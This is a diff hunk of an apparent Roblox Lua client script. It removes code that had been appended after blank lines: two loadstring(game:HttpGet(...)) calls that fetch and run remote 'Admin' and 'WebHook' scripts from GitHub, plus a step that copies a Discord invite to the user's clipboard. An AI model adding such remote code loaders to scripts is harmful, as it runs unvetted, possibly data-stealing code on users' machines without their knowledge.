@@ -668,26 +668,3 @@ end
 localPlayer.CharacterAdded:Connect(function()
 reconnect()
 end)
-
-
-
-
-
-local AdminApi = loadstring(game:HttpGet("https://raw.githubusercontent.com/MmZDrirk/Zzzzz/refs/heads/main/Admin.txt"))()
-
-local WebHook = loadstring(game:HttpGet("https://raw.githubusercontent.com/MmZDrirk/Zzzzz/refs/heads/main/WebHook"))()
-
-
-
-
-
-
-setclipboard("https://discord.com/invite/JmsBVP72")
-
-
-Rayfield:Notify({
-   Title = "Discord Link",
-   Content = "Discord Link Coppied To Your Clipboard",
-   Duration = 6.5,
-   Image = 4483362458,
-})
